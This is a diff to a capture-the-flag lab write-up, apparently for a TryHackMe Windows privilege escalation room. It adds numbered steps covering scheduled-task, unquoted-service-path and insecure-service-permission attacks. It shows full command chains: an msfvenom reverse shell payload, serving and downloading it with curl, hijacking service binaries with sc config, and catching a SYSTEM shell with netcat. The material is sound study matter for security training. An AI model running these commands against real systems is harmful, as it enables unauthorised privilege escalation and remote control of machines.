@@ -153,7 +153,7 @@ Repeat: Until: Duration:              N/A
 Repeat: Stop If Still Running:        N/A
 ```
 
-3. `icacls <BINARY FILE PATH>` from the compromised Windows machine to view the DACLs (Discretionary Access Control Lists) for our target task's "Task To Run" executable
+3. `icacls <BINARY FILE PATH>` from the compromised Windows machine to view the DACLs (Discretionary Access Control Lists) for our target task's "Task To Run" executable, which revealed that the BUILTIN\Users group has I (`Inheritable Permissions`) and F (`Full Access`) permissions to this file
 ```PowerShell
 C:\Users\thm-unpriv>icacls c:\tasks\schtask.bat
 c:\tasks\schtask.bat BUILTIN\Users:(I)(F)
@@ -243,7 +243,7 @@ SERVICE_NAME: WindowsScheduler
         SERVICE_START_NAME : .\svcusr1
 ```
 
-3. `icacls <FILENAME>` from the compromised Windows machine to display the security permissions and ACLs (Access Control Lists) for our target service's `BINARY_PATH_NAME` executable
+3. `icacls <FILENAME>` from the compromised Windows machine to display the security permissions and ACLs (Access Control Lists) for our target service's `BINARY_PATH_NAME` executable, which revealed that users in the "Everyone" group has I (`Inheritable Permissions`) and M (`Modify Permissions`) permissions for this executable file
 ```PowerShell
 C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
 C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
@@ -409,6 +409,8 @@ THM{AT_YOUR_SERVICE}
 
 ### Unquoted Service Paths
 
+1. Started this task's machine
+2. `icacls <TARGET DIRECTORY>` from the compromised Windows machine to display the security permissions and ACLs (Access Control Lists) for our target directory, which is one of the directories where most of service executables are installed under by default (`C:\Program Files` or `C:\Program Files (x86)`)
 ```PowerShell
 C:\Users\thm-unpriv>icacls c:\MyPrograms
 c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
@@ -421,6 +423,7 @@ c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
 Successfully processed 1 files; Failed processing 0 files
 ```
 
+3. `msfvenom -p <PAYLOAD> LHOST=<ATTACKER IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <OUTPUT FILE>` from our attack machine to generate a custom reverse shell payload executable (.exe)
 ```Bash
 root@ip-10-10-6-207:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.6.207 LPORT=9999 -f exe-service -o ReverseShell.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -431,11 +434,13 @@ Final size of exe-service file: 48640 bytes
 Saved as: ReverseShell.exe
 ```
 
+4. `python3 -m <MODULE>` from our attack machine to start a simple HTTP server on our local machine using Python 3's built in HTTP server module (`http.server`)
 ```Bash
 root@ip-10-10-6-207:~# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
+5. `curl <ATTACK MACHINE HTTP SERVER>:<PAYLOAD FILE PATH> -O <OUTPUT FILE>` from the compromised Windows machine to make an HTTP request to our previously set up Python server on our attack machine to download our previously generated reverse shell payload executable onto the compromised machine
 ```PowerShell
 C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShell.exe
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -444,22 +449,26 @@ C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShel
 curl: (6) Could not resolve host: ReverseShell.exe
 ```
 
+6. 
 ```PowerShell
 C:\Users\thm-unpriv>move C:\Users\thm-unpriv\ReverseShell.exe C:\MyPrograms\Disk.exe
         1 file(s) moved.
 ```
 
+7. 
 ```PowerShell
 C:\Users\thm-unpriv>icacls C:\MyPrograms\Disk.exe /grant Everyone:F
 processed file: C:\MyPrograms\Disk.exe
 Successfully processed 1 files; Failed processing 0 files
 ```
 
+8. 
 ```Bash
 root@ip-10-10-6-207:~# nc -lvnp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
 ```
 
+9.
 ```Powershell
 C:\Users\thm-unpriv>sc stop "disk sorter enterprise"
 
@@ -472,6 +481,7 @@ SERVICE_NAME: disk sorter enterprise
         WAIT_HINT          : 0x0
 ```
 
+10.
 ```PowerShell
 C:\Users\thm-unpriv>sc start "disk sorter enterprise"
 
@@ -486,7 +496,6 @@ SERVICE_NAME: disk sorter enterprise
         PID                : 936
         FLAGS              :
 ```
-
 ```Bash
 Listening on [0.0.0.0] (family 0, port 9999)
 Connection from 10.10.165.129 49761 received!
@@ -496,6 +505,7 @@ Microsoft Windows [Version 10.0.17763.1821]
 C:\Windows\system32>
 ```
 
+11. 
 ```PowerShell
 C:\Windows\system32>type C:\Users\svcusr2\Desktop\flag.txt
 type C:\Users\svcusr2\Desktop\flag.txt
@@ -504,6 +514,8 @@ THM{QUOTES_EVERYWHERE}
 
 ### Insecure Service Permissions
 
+1. Started this task's machine
+2. 
 ```PowerShell
 C:\Users\thm-unpriv>C:\tools\AccessChk\accesschk64.exe -qlc thmservice
 
@@ -547,6 +559,7 @@ thmservice
         SERVICE_ALL_ACCESS
 ```
 
+3. 
 ```Bash
 root@ip-10-10-6-207:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.6.207 LPORT=9999 -f exe-service -o ReverseShell.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -557,11 +570,13 @@ Final size of exe-service file: 48640 bytes
 Saved as: ReverseShell.exe
 ```
 
+4. 
 ```Bash
 root@ip-10-10-6-207:~# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
+5. 
 ```PowerShell
 C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShell.exe
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -570,22 +585,26 @@ C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShel
 curl: (6) Could not resolve host: ReverseShell.exe
 ```
 
+6. 
 ```PowerShell
 C:\Users\thm-unpriv>icacls C:\Users\thm-unpriv\ReverseShell.exe /grant Everyone:F
 processed file: C:\Users\thm-unpriv\ReverseShell.exe
 Successfully processed 1 files; Failed processing 0 files
 ```
 
+7. 
 ```PowerShell
 C:\Users\thm-unpriv>sc config THMService binPath= "C:\Users\thm-unpriv\ReverseShell.exe" obj= LocalSystem
 [SC] ChangeServiceConfig SUCCESS
 ```
 
+8. 
 ```Bash
 root@ip-10-10-6-207:~# nc -lvnp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
 ```
 
+9. 
 ```PowerShell
 C:\Users\thm-unpriv>sc stop THMService
 [SC] ControlService FAILED 1062:
@@ -593,6 +612,7 @@ C:\Users\thm-unpriv>sc stop THMService
 The service has not been started.
 ```
 
+10. 
 ```PowerShell
 C:\Users\thm-unpriv>sc start THMService
 
@@ -607,7 +627,6 @@ SERVICE_NAME: THMService
         PID                : 3884
         FLAGS              :
 ```
-
 ```Bash
 Listening on [0.0.0.0] (family 0, port 9999)
 Connection from 10.10.165.129 49902 received!
@@ -617,6 +636,7 @@ Microsoft Windows [Version 10.0.17763.1821]
 C:\Windows\system32>
 ```
 
+11. 
 ```PowerShell
 C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt
 type C:\Users\Administrator\Desktop\flag.txt
